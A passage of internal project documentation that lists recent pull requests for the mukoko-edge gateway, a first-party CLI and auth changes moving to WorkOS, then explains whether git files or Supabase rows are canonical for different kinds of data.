- **#82** — mukoko-edge: `/v1/design/*` and `/v1/mcp/design` routes + wire Supabase design project
- **#81** — `@nyuchi/mzizi-cli` first-party CLI (login/logout/whoami/add/search/list)
- **#80** — `components.requires_auth` opt-in flag with first-party bypass + 401 reason contract
- **#79** — First-party tenant middleware + `whoami` MCP tool — auth moves to WorkOS
- **#78** — `first_party_clients` allow-list table + `is_first_party_caller()` helper
- **#58** — Repo sync: v4.0.33–v4.0.44 — nodes, plug design into mukoko-edge gateway
- **#45** — Build: Ubuntu Five Pillars & Five Principles structural doctrine (parts landed via #108)

When in doubt about whether something is canonical, ask **which kind of thing it is** — the blanket "prefer the Supabase row over any file in the repo" that stood here is now wrong three times over. Component source is git (§8.3), doctrine and long-form docs are git (§15.17), skills are git in `mzizi-tools` (§15.23). Prefer the Supabase row for components' metadata, tokens, `changelog`, and the event streams; prefer the file for everything above.
